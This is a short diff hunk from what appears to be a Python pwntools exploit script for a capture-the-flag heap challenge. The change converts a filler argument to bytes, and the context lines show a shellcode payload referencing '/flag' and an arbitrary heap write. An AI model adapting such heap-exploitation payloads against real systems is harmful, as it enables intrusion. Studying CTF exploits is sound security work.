@@ -92,7 +92,7 @@ payload = flat({
                 .string "/flag"
         ''')
     }
-}, filler='\x00', length=0x208)
+}, filler=b'\x00', length=0x208)
 # arbitrary write 0x208 bytes at most from heap_base_addr+0x3e00
 create(7, 0x208)
 create(8, 0x208)
